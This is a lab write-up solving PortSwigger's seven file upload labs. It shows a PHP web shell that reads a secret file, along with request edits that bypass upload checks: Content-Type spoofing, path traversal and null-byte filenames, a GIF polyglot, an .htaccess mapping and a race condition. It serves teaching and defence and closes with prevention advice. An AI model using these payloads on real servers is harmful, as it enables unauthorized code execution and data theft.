# File Upload Vulnerabilities Writeup

**Author:** Ihtisham\
**Topic:** File Upload Vulnerabilities\
**Platform:** PortSwigger Web Security Academy\
**Tools:** Burp Suite, Web Browser

***

## Table of Contents

1. [Lab 1 — Remote Code Execution via Web Shell Upload](file-upload-vulnerabilities-writeup.md#lab-1--remote-code-execution-via-web-shell-upload)
2. [Lab 2 — Web Shell Upload via Content-Type Restriction Bypass](file-upload-vulnerabilities-writeup.md#lab-2--web-shell-upload-via-content-type-restriction-bypass)
3. [Lab 3 — Web Shell Upload via Path Traversal](file-upload-vulnerabilities-writeup.md#lab-3--web-shell-upload-via-path-traversal)
4. [Lab 4 — Web Shell Upload via Obfuscated File Extension](file-upload-vulnerabilities-writeup.md#lab-4--web-shell-upload-via-obfuscated-file-extension)
5. [Lab 5 — Remote Code Execution via Polyglot Web Shell Upload](file-upload-vulnerabilities-writeup.md#lab-5--remote-code-execution-via-polyglot-web-shell-upload)
6. [Lab 6 — Web Shell Upload via Extension Blacklist Bypass](file-upload-vulnerabilities-writeup.md#lab-6--web-shell-upload-via-extension-blacklist-bypass)
7. [Lab 7 — Web Shell Upload via Race Condition](file-upload-vulnerabilities-writeup.md#lab-7--web-shell-upload-via-race-condition)

***

## Before You Start

### What is a Web Shell?

A web shell is a script (usually PHP) that you upload to a server. Once it's there, you can visit it in your browser and it will run commands on the server for you.

### What is a File Upload Vulnerability?

Many websites let you upload files like profile pictures. If the website doesn't properly check what you're uploading, you can upload a malicious script instead of an image.

### The Payload We Use

In every lab, we upload a PHP file with this code:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

This reads the file `/home/carlos/secret` on the server and prints its contents on the page.

### Login Credentials

All labs use: **Username:** `wiener` | **Password:** `peter`

***

## Lab 1 — Remote Code Execution via Web Shell Upload

**Difficulty:** Apprentice\
**What's happening:** The server has no file upload validation at all. You can upload anything.

### Goal

Upload a PHP web shell and read the file `/home/carlos/secret`.

### Steps

**Step 1:** Log in with `wiener:peter` and go to "My Account". You will see an avatar upload section.

![My Account page with avatar upload section](<../../.gitbook/assets/Unknown image (69)>)

**Step 2:** Create a file called `exploite1.php` with this content:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Upload this file using the avatar upload form.

**Step 3:** After uploading, open the uploaded file in your browser by navigating to:

```
https://<your-lab-url>/files/avatars/exploite1.php
```

The server executes the PHP code and shows the secret:

![The secret value displayed after accessing the PHP file](<../../.gitbook/assets/Unknown image (70)>)

**Step 4:** Copy the secret and submit it. Lab solved.

![Lab solved confirmation](<../../.gitbook/assets/Unknown image (71)>)

### Why did this work?

The server didn't check the file type at all. It accepted a `.php` file and stored it in a directory where PHP files get executed. When we visited the file, the server ran our code.

***

## Lab 2 — Web Shell Upload via Content-Type Restriction Bypass

**Difficulty:** Apprentice\
**What's happening:** The server checks the `Content-Type` header to see if the file is an image. But this header is easy to fake.

### Goal

Upload a PHP web shell by changing the Content-Type header.

### Steps

**Step 1:** Log in, go to "My Account", and try to upload `exploite1.php`. Intercept the request in Burp Suite.

The server rejects it because the Content-Type is `application/octet-stream`:

![Burp Suite showing 403 error - Content-Type application/octet-stream is not allowed](<../../.gitbook/assets/Unknown image (72)>)

The server says: "Only image/jpeg and image/png are allowed."

**Step 2:** In Burp Repeater, find this line in the request body:

```
Content-Type: application/octet-stream
```

Change it to:

```
Content-Type: image/jpeg
```

Keep everything else the same (the PHP code stays as is). Send the request.

![After changing Content-Type to image/jpeg, the server accepts the upload with 200 OK](<../../.gitbook/assets/Unknown image (73)>)

The server now thinks it's a JPEG image and accepts it. The actual file content is still our PHP code.

**Step 3:** Visit the uploaded file in your browser:

```
https://<your-lab-url>/files/avatars/exploite1.php
```

![The secret value is shown](<../../.gitbook/assets/Unknown image (74)>)

**Step 4:** Submit the secret. Lab solved.

![Lab solved confirmation](<../../.gitbook/assets/Unknown image (75)>)

### Why did this work?

The server only checked the `Content-Type` header, which is sent by the browser. We changed it using Burp Suite. The server trusted this header instead of actually looking at the file content.

***

## Lab 3 — Web Shell Upload via Path Traversal

**Difficulty:** Practitioner\
**What's happening:** The server stores uploaded files in a directory where PHP files won't execute. But we can use path traversal to upload to a different directory.

### Goal

Upload a PHP web shell outside the non-executable directory.

### What is Path Traversal?

`../` means "go up one directory." If files are uploaded to `/files/avatars/`, then a filename of `../exploite1.php` puts the file at `/files/exploite1.php` instead.

### Steps

**Step 1:** Log in, upload `exploite1.php`, and intercept the request in Burp Suite.

Find the filename in the request:

```
Content-Disposition: form-data; name="avatar"; filename="exploite1.php"
```

Change it to (use `..%2f` which is the URL-encoded form of `../`):

```
Content-Disposition: form-data; name="avatar"; filename="..%2fexploite1.php"
```

Send the request.

![Burp Suite showing the path traversal filename - server responds 200 OK](<../../.gitbook/assets/Unknown image (76)>)

The server accepts the upload. The file is now stored one directory above `avatars/`.

**Step 2:** Access the file at the new location (note: NOT in the `avatars` folder):

```
https://<your-lab-url>/files/exploite1.php
```

![The secret displayed after accessing the file at the traversed path](<../../.gitbook/assets/Unknown image (77)>)

**Step 3:** Submit the secret. Lab solved.

![Lab solved confirmation](<../../.gitbook/assets/Unknown image (78)>)

### Why did this work?

The `avatars/` directory was configured to not execute PHP files. But the server didn't remove `../` from the filename, so we placed our file in the parent directory where PHP execution is allowed.

***

## Lab 4 — Web Shell Upload via Obfuscated File Extension

**Difficulty:** Practitioner\
**What's happening:** The server blocks `.php` files by checking the extension. But it's vulnerable to null byte injection.

### Goal

Upload a PHP web shell by tricking the extension check with a null byte.

### What is a Null Byte?

A null byte (`%00`) is a special character that means "end of string" in many systems. If you name a file `shell.php%00.jpg`:

* The server checks the extension, sees `.jpg`, and thinks it's an image — allowed.
* When saving to disk, the null byte cuts off everything after it, so the file is saved as `shell.php`.

### Steps

**Step 1:** Log in, upload `exploite1.php`, and intercept the request in Burp Suite.

Change the filename to:

```
Content-Disposition: form-data; name="avatar"; filename="exploite1.php%00.jpg"
```

Send the request.

![Burp Suite showing the null byte filename - server responds 200 OK](<../../.gitbook/assets/Unknown image (79)>)

The server sees `.jpg` and allows the upload. But the file is actually saved as `exploite1.php`.

**Step 2:** Visit the file:

```
https://<your-lab-url>/files/avatars/exploite1.php
```

![The secret value is displayed](<../../.gitbook/assets/Unknown image (80)>)

**Step 3:** Submit the secret. Lab solved.

![Lab solved confirmation](<../../.gitbook/assets/Unknown image (81)>)

### Why did this work?

The null byte (`%00`) tricked the server. During validation, the server saw the `.jpg` extension and allowed it. During saving, the null byte truncated the filename to just `exploite1.php`.

***

## Lab 5 — Remote Code Execution via Polyglot Web Shell Upload

**Difficulty:** Practitioner\
**What's happening:** The server checks the file's magic bytes (the first few bytes that identify file type). We need to make our PHP file look like an image.

### Goal

Upload a PHP web shell by prepending image magic bytes to the file.

### What are Magic Bytes?

Every file type starts with specific bytes that identify it. For example:

* GIF files start with `GIF87a` or `GIF89a`
* PNG files start with `‰PNG`
* JPEG files start with `ÿØÿ`

The server reads these first bytes to verify the file type.

### Steps

**Step 1:** Log in, upload `exploite1.php`, and intercept the request in Burp Suite.

In the file content area of the request, add `GIF87a` right before the PHP code:

```
GIF87a
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Send the request.

![Burp Suite showing GIF87a prepended to the PHP payload - server responds 200 OK](<../../.gitbook/assets/Unknown image (82)>)

The server reads the first bytes, sees `GIF87a`, and thinks it's a GIF image. It accepts the upload.

**Step 2:** Visit the file in your browser:

```
https://<your-lab-url>/files/avatars/exploite1.php
```

![Browser showing GIF87a followed by the secret value](<../../.gitbook/assets/Unknown image (83)>)

You'll see `GIF87a` followed by the secret. The `GIF87a` is just text that gets printed — ignore it and copy only the secret string.

**Step 3:** Submit the secret. Lab solved.

![Lab solved confirmation](<../../.gitbook/assets/Unknown image (84)>)

### Why did this work?

The server only checked the first few bytes of the file to determine its type. By adding `GIF87a` at the start, we passed the check. The rest of the file was still valid PHP code that the server executed.

***

## Lab 6 — Web Shell Upload via Extension Blacklist Bypass

**Difficulty:** Practitioner\
**What's happening:** The server blocks `.php` files. But it allows uploading `.htaccess` files, which can change how the server handles file extensions.

### Goal

Upload a `.htaccess` config file to make the server treat a custom extension as PHP, then upload the shell with that extension.

### What is .htaccess?

On Apache web servers, `.htaccess` is a configuration file. You can use it to tell Apache: "treat files with extension `.l33t` as PHP code." If we upload this file, we can then upload our shell as `exploite1.l33t` and the server will execute it as PHP.

### Steps

**Step 1:** Log in and go to "My Account". Select `exploite1.php` for upload.

![My Account page with exploite1.php selected for upload](<../../.gitbook/assets/Unknown image (85)>)

**Step 2:** First, we need to upload a `.htaccess` file. Intercept an upload request in Burp Suite and modify it:

* Change filename to `.htaccess`
* Change Content-Type to `text/plain`
* Replace file content with:

```
AddType application/x-httpd-php .l33t
```

This tells Apache: "Execute any `.l33t` file as PHP."

![Burp Suite showing the .htaccess upload with AddType directive](<../../.gitbook/assets/Unknown image (86)>)

**Step 3:** Now upload the actual web shell. Create a new request and:

* Set filename to `exploite1.l33t`
* Set Content-Type to `application/octet-stream`
* Set file content to:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Send the request.

![Burp Suite showing the upload of exploite1.l33t - server responds 200 OK](<../../.gitbook/assets/Unknown image (87)>)

The server doesn't block `.l33t` because it's not in the blacklist.

**Step 4:** Visit the file:

```
https://<your-lab-url>/files/avatars/exploite1.l33t
```

![The secret displayed - Apache executed the .l33t file as PHP](<../../.gitbook/assets/Unknown image (88)>)

Thanks to our `.htaccess` file, Apache treated `exploite1.l33t` as PHP and executed it.

**Step 5:** Submit the secret. Lab solved.

![Lab solved confirmation](<../../.gitbook/assets/Unknown image (89)>)

### Why did this work?

The server used a blacklist (blocking `.php`). But it didn't block `.htaccess` files. We uploaded a `.htaccess` that told Apache to treat `.l33t` files as PHP. Then we uploaded our shell with a `.l33t` extension, which wasn't blacklisted.

**Lesson:** Blacklists are weak. A whitelist (only allow `.jpg`, `.png`, `.gif`) is much safer.

***

## Lab 7 — Web Shell Upload via Race Condition

**Difficulty:** Expert\
**What's happening:** The server saves the file first, then checks it, then deletes it if the check fails. There's a tiny time window where the file exists before being deleted.

### Goal

Upload a PHP web shell and access it in the brief moment before the server deletes it.

### What is a Race Condition?

The server does things in this order:

1. Save the uploaded file to disk
2. Run validation checks (virus scan, file type check)
3. If checks fail, delete the file

Between step 1 and step 3, the file exists on the server for a split second. If we can access it during that window, we win.

### Steps

**Step 1:** Look at the server-side code. It shows the vulnerability clearly:

![Server-side PHP code - file is saved first, then validated, then deleted if invalid](<../../.gitbook/assets/Unknown image (90)>)

Notice: `move_uploaded_file()` runs first (saves the file), then `checkViruses()` and `checkFileType()` run after. If either check fails, `unlink()` deletes the file. The gap between saving and deleting is our window.

**Step 2:** Log in, upload `exploite1.php`, and intercept the request in Burp Suite.

![Burp Suite showing the upload - server responds 403 with "Sorry, only JPG and PNG files are allowed"](<../../.gitbook/assets/Unknown image (91)>)

The server rejects our file — but it briefly existed on the server before being deleted.

**Step 3:** To exploit the race condition, we need to send two types of requests at the same time:

* **POST request** — Uploads the PHP file (creates it temporarily)
* **GET request** — Tries to access `/files/avatars/exploite1.php` (tries to reach it before deletion)

Set up both requests in Burp Repeater:

![Burp Suite showing both the GET request for the file and the upload request side by side](<../../.gitbook/assets/Unknown image (92)>)

**Step 4:** Open multiple tabs in Burp Repeater — one for the upload and several GET requests to access the file:

![Multiple tabs ready for parallel sending - upload + multiple GET requests](<../../.gitbook/assets/Unknown image (93)>)

Use the **"Send group (parallel)"** feature to fire all requests at the exact same time:

![Send group parallel button in Burp Suite](<../../.gitbook/assets/Unknown image (94)>)

**Step 5:** Check the responses. One of the GET requests should return **200 OK** with the secret:

![One GET request returns 200 OK with the secret value - we hit the race window](<../../.gitbook/assets/Unknown image (95)>)

We got lucky — one of our GET requests reached the file before the server deleted it. The secret is shown in the response.

**Step 6:** Submit the secret. Lab solved.

![Lab solved confirmation](<../../.gitbook/assets/Unknown image (96)>)

### Why did this work?

The server validated files **after** saving them. For a brief moment, our PHP file existed on the server. By sending many GET requests at the same time as the upload, we managed to access the file during that tiny window.

**Fix:** Validate files **before** saving them to disk. Never let unvalidated files touch the filesystem.

***

## Quick Reference

| Lab | What the server checks                    | How we bypass it                             |
| --- | ----------------------------------------- | -------------------------------------------- |
| 1   | Nothing                                   | Just upload the PHP file directly            |
| 2   | Content-Type header                       | Change the header to `image/jpeg` in Burp    |
| 3   | Doesn't execute PHP in upload folder      | Use `../` in filename to escape the folder   |
| 4   | File extension (blocks `.php`)            | Add `%00.jpg` after `.php` (null byte)       |
| 5   | Magic bytes (file signature)              | Add `GIF87a` before the PHP code             |
| 6   | Extension blacklist (blocks `.php`)       | Upload `.htaccess` to map `.l33t` to PHP     |
| 7   | Full validation (but checks after saving) | Race condition — access file before deletion |

***

## How to Prevent File Upload Vulnerabilities

1. **Whitelist extensions** — Only allow `.jpg`, `.png`, `.gif`. Don't use a blacklist.
2. **Check file content** — Don't just check the header or extension. Actually parse the file.
3. **Rename files** — Generate random filenames on the server. Don't use the name the user provides.
4. **Don't execute uploads** — Store files outside the web root or in a non-executable directory.
5. **Block config files** — Reject `.htaccess`, `web.config`, etc.
6. **Validate before saving** — Check everything in memory before writing to disk.

***

> **Disclaimer:** This writeup is for educational purposes only. All labs were done on PortSwigger's intentionally vulnerable platform. Don't try this on real systems without permission.
